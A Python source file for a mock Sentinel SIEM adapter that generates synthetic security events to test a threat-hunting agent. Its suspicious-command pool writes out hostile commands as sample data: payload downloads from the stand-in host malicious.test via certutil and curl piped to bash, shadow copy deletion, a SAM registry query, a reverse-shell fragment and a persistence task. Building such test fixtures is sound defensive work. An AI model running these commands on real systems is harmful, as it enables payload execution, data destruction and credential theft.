"""Mock Sentinel adapter — returns realistic synthetic results without hitting any API."""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

from mssp_hunt_agent.adapters.base import SIEMAdapter
from mssp_hunt_agent.models.hunt_models import ExabeamQuery, QueryIntent
from mssp_hunt_agent.models.result_models import ExabeamEvent, QueryResult

# ── Realistic synthetic data pools (based on actual PurpleStratus Sentinel) ──

_USERS = [
    "Felipe.Vilalta@purplestratus.onmicrosoft.com",
    "Ahmed.Shiekhaden@purplestratus.onmicrosoft.com",
    "Herb.Schreib@purplestratus.onmicrosoft.com",
    "Trevor.Cutshall@purplestratus.onmicrosoft.com",
    "svc-backup@purplestratus.onmicrosoft.com",
    "svc-deploy@purplestratus.onmicrosoft.com",
    "NT AUTHORITY\\SYSTEM",
    "NT AUTHORITY\\NETWORK SERVICE",
]

_SRC_IPS = [
    "10.10.5.22", "10.10.5.35", "10.10.5.100",
    "192.168.1.105", "172.16.0.44",
    "203.0.113.77", "198.51.100.12",
    "45.33.32.156",   # suspicious external
    "185.220.101.42",  # known Tor exit
]

_DST_IPS = [
    "10.0.0.1", "10.0.0.50", "10.10.10.10",
    "52.96.166.130",   # Microsoft 365
    "13.107.42.14",    # Azure AD
    "20.190.128.0",    # Azure management
]

_HOSTNAMES = [
    "adv01-eus-windows11-iso-test",
    "adv01-eus-unix-iso-test",
    "DC01.purplestratus.local",
    "FILE-SRV01",
    "WEB-PROXY01",
    "EXCH-01",
]

_DOMAINS = [
    "purplestratus.local",
    "purplestratus.onmicrosoft.com",
    "login.microsoftonline.com",
    "graph.microsoft.com",
    "unknown-cdn.ru",
    "malicious.test",
]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "PowerShell/7.4.1",
]

_PROCESSES = [
    "powershell.exe", "cmd.exe", "rundll32.exe", "svchost.exe",
    "notepad.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe",
    "wmic.exe", "regsvr32.exe", "cscript.exe",
]

_SUSPICIOUS_COMMANDS = [
    "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "cmd.exe /c whoami /priv",
    "certutil -urlcache -split -f http://malicious.test/payload.exe",
    'reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users"',
    "net user /domain",
    "nltest /dclist:",
    "wmic shadowcopy delete",
    "vssadmin delete shadows /all /quiet",
    "curl http://malicious.test/payload.sh | bash",
    "python3 -c 'import socket,subprocess;s=socket.socket()'",
    "schtasks /create /tn persist /tr malware.exe /sc onlogon",
]

_BENIGN_COMMANDS = [
    "notepad.exe C:\\Users\\docs\\report.txt",
    "svchost.exe -k netsvcs",
    "C:\\Windows\\System32\\spoolsv.exe",
    "tasklist /v",
    "ipconfig /all",
]

_HASHES = [
    "e99a18c428cb38d5f260853678922e03",
    "d41d8cd98f00b204e9800998ecf8427e",
    "5d41402abc4b2a76b9719d911017c592",
    "a3f2b8c1d4e5f6789012345678901234",
    "098f6bcd4621d373cade4e832627b4f6",
]

# Sentinel event IDs mapped to intent (matching real SecurityEvent table data)
_EVENT_TYPES_BY_INTENT: dict[QueryIntent, list[str]] = {
    QueryIntent.BASELINE: [
        "4624",    # Successful logon
        "4672",    # Special privileges assigned
        "5156",    # WFP allowed connection
        "SignInSuccess",
        "AADNonInteractive",
    ],
    QueryIntent.ANOMALY_CANDIDATE: [
        "4625",    # Failed logon
        "4740",    # Account lockout
        "4688",    # Process creation
        "4698",    # Scheduled task created
        "4720",    # User account created
        "4732",    # Member added to local group
        "SuspiciousSignIn",
        "ConditionalAccessBlock",
    ],
    QueryIntent.PIVOT: [
        "4663",    # Object access attempt
        "4660",    # Object deleted
        "5152",    # WFP blocked packet
        "DnsQuery",
        "FileAccess",
        "NetworkConnection",
        "SyslogCron",
    ],
    QueryIntent.CONFIRMATION: [
        "SecurityAlert",
        "SecurityIncident",
        "ThreatIntelMatch",
        "BehaviorAnalyticsAlert",
        "5038",    # Code integrity - invalid image hash
    ],
}

# Alert titles matching real Sentinel alerts
_ALERT_TITLES = [
    "Attempt to bypass conditional access rule in Azure AD",
    "Suspicious PowerShell command detected",
    "Unusual process execution on Linux host",
    "Multiple failed sign-in attempts from single IP",
    "Anomalous token usage detected",
    "Rare process execution on Windows host",
    "Suspicious scheduled task creation",
    "Potential credential dumping activity",
]


def _random_timestamp(base: datetime, spread_hours: int = 720) -> str:
    delta = timedelta(hours=random.randint(0, spread_hours))
    return (base - delta).strftime("%Y-%m-%dT%H:%M:%SZ")


def _generate_events(query: ExabeamQuery, count: int) -> list[ExabeamEvent]:
    base_time = datetime.now(timezone.utc)
    event_pool = _EVENT_TYPES_BY_INTENT.get(query.intent, ["sentinel-event"])
    events: list[ExabeamEvent] = []

    for i in range(count):
        is_suspicious = query.intent in (QueryIntent.ANOMALY_CANDIDATE, QueryIntent.CONFIRMATION)
        is_pivot = query.intent == QueryIntent.PIVOT

        # Pick command line based on intent
        command_line = None
        if query.intent != QueryIntent.BASELINE:
            if is_suspicious and random.random() > 0.4:
                command_line = random.choice(_SUSPICIOUS_COMMANDS)
            elif random.random() > 0.7:
                command_line = random.choice(_BENIGN_COMMANDS)

        # Suspicious events use external IPs more often
        src_ip = random.choice(_SRC_IPS)
        if is_suspicious and random.random() > 0.5:
            src_ip = random.choice(_SRC_IPS[-3:])  # external/suspicious IPs

        # Alert titles for confirmation events
        fields: dict = {
            "mock": True,
            "query_intent": query.intent.value,
            "source": "sentinel",
            "table": "SecurityEvent",
        }
        if query.intent == QueryIntent.CONFIRMATION:
            fields["alert_title"] = random.choice(_ALERT_TITLES)
            fields["table"] = "SecurityAlert"
            fields["severity"] = random.choice(["Low", "Medium", "High", "Critical"])
            fields["mitre_techniques"] = random.choice([
                ["T1078", "T1098"],
                ["T1059.001"],
                ["T1021.002", "T1047"],
                ["T1566.001"],
            ])

        if is_pivot:
            fields["table"] = random.choice(["SecurityEvent", "Syslog", "SigninLogs"])

        events.append(
            ExabeamEvent(
                timestamp=_random_timestamp(base_time),
                event_type=random.choice(event_pool),
                user=random.choice(_USERS),
                src_ip=src_ip,
                dst_ip=random.choice(_DST_IPS),
                hostname=random.choice(_HOSTNAMES),
                domain=random.choice(_DOMAINS),
                process_name=(
                    random.choice(_PROCESSES)
                    if query.intent != QueryIntent.BASELINE
                    else None
                ),
                command_line=command_line,
                file_hash=random.choice(_HASHES) if random.random() > 0.6 else None,
                user_agent=random.choice(_USER_AGENTS) if random.random() > 0.5 else None,
                fields=fields,
            )
        )
    return events


class MockSentinelAdapter(SIEMAdapter):
    """Returns realistic synthetic Sentinel results without hitting any real API."""

    def execute_query(self, query: ExabeamQuery) -> QueryResult:
        count_ranges = {
            QueryIntent.BASELINE: (30, 150),
            QueryIntent.ANOMALY_CANDIDATE: (5, 25),
            QueryIntent.PIVOT: (10, 50),
            QueryIntent.CONFIRMATION: (0, 8),
        }
        lo, hi = count_ranges.get(query.intent, (5, 20))
        count = random.randint(lo, hi)
        events = _generate_events(query, count)

        return QueryResult(
            query_id=query.query_id,
            query_text=query.query_text,
            status="success",
            result_count=len(events),
            events=events,
            execution_time_ms=random.randint(120, 3500),
            metadata={"adapter": "mock_sentinel", "simulated": True},
        )

    def test_connection(self) -> bool:
        return True

    def get_adapter_name(self) -> str:
        return "MockSentinelAdapter"
